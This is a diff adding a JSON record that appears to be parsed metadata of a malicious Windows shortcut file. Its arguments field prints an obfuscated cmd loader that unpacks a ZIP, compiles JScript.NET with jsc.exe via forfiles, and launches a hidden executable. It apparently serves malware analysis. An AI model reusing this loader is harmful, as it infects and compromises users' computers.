@@ -1,0 +1,61 @@
+{
+    "data": {
+        "command_line_arguments": "/c \"set PATH=%windir%\\system32;%PATH% & (for /R \"%USERPROFILE%\" %f in (dokazatelstva.zip) do @IF EXIST %f (chcp 65001 | echo | set /p=\"import System;import System.IO;import System.IO.Compression;import System.Text;import System.Diagnostics;function Main(){var args:String[]=System.Environment.GetCommandLineArgs();Directory.CreateDirectory(args[2]);System.IO.Compression.ZipFile.ExtractToDirectory(args[1], args[2]);System.IO.Compression.ZipFile.ExtractToDirectory(args[2] + \"\\\\\" + (Convert.ToChar(103)+Convert.ToChar(111)+Convert.ToChar(113)+Convert.ToChar(46)+Convert.ToChar(105)+Convert.ToChar(110)+Convert.ToChar(105)), args[2]);Process.Start(\"cmd.exe\", \"/C move \" + System.Reflection.Assembly.GetExecutingAssembly().Location + \" \" + System.Reflection.Assembly.GetExecutingAssembly().Location + \"_\");}Main();\">%TEMP%\\9SDTHRQOG1AH.a & for /f %j in ('dir /b /s /a:-d /o:-n \"%SystemRoot%\\Microsoft.Net\\Framework\\*jsc.exe\"') do @set \"_jsc=%j\" & for /L %i in (1,1,3) do @if exist \"%USERPROFILE%\\MI5DL1FAUS8G\\D5OY8HG76T.exe\" (^st^art \"\" /MIN \"%USERPROFILE%\\MI5DL1FAUS8G\\D5OY8HG76T.exe\" & exit) else (@if exist %TEMP%\\unzip.exe (%TEMP%\\unzip.exe \"%f\" \"%USERPROFILE%\\MI5DL1FAUS8G\") else (@if not exist %TEMP%\\unzip.exe_ (@if not exist %TEMP%\\unzip.exe (C:\\Windows\\system32\\forfiles.exe /P %SystemRoot% /M notepad.exe /C \"cmd /c %_jsc% /nologo /r:System.IO.Compression.FileSystem.dll /out:%TEMP%\\unzip.exe %TEMP%\\9SDTHRQOG1AH.a\")))) ))\"",
+        "icon_location": "C:\\Windows\\System32\\shell32.dll",
+        "working_directory": "C:\\Windows\\System32                                                                                                                                                                                                                                                 "
+    },
+    "extra": {},
+    "header": {
+        "accessed_time": "2023-08-25T17:43:51+00:00",
+        "creation_time": "2023-08-25T17:43:51+00:00",
+        "file_flags": [
+            "FILE_ATTRIBUTE_ARCHIVE"
+        ],
+        "file_size": 16,
+        "guid": "00021401-0000-0000-C000-000000000046",
+        "header_size": 76,
+        "hotkey": "UNSET - UNSET {0x0000}",
+        "icon_index": 1,
+        "link_flags": [
+            "HasTargetIDList",
+            "HasWorkingDir",
+            "HasArguments",
+            "HasIconLocation",
+            "IsUnicode"
+        ],
+        "modified_time": "2023-08-25T17:43:51+00:00",
+        "r_file_flags": 32,
+        "r_hotkey": 0,
+        "r_link_flags": 241,
+        "reserved0": 0,
+        "reserved1": 0,
+        "reserved2": 0,
+        "windowstyle": "SW_SHOWMINNOACTIVE"
+    },
+    "link_info": {},
+    "target": {
+        "index": 78,
+        "items": [
+            {
+                "class": "Root Folder",
+                "guid": "20D04FE0-3AEA-1069-A2D8-08002B30309D",
+                "sort_index": "My Computer"
+            },
+            {
+                "class": "Volume Item",
+                "data": null,
+                "flags": "0xf"
+            },
+            {
+                "class": "File entry"
+            },
+            {
+                "class": "File entry"
+            },
+            {
+                "class": "File entry"
+            }
+        ],
+        "size": 139
+    }
+}
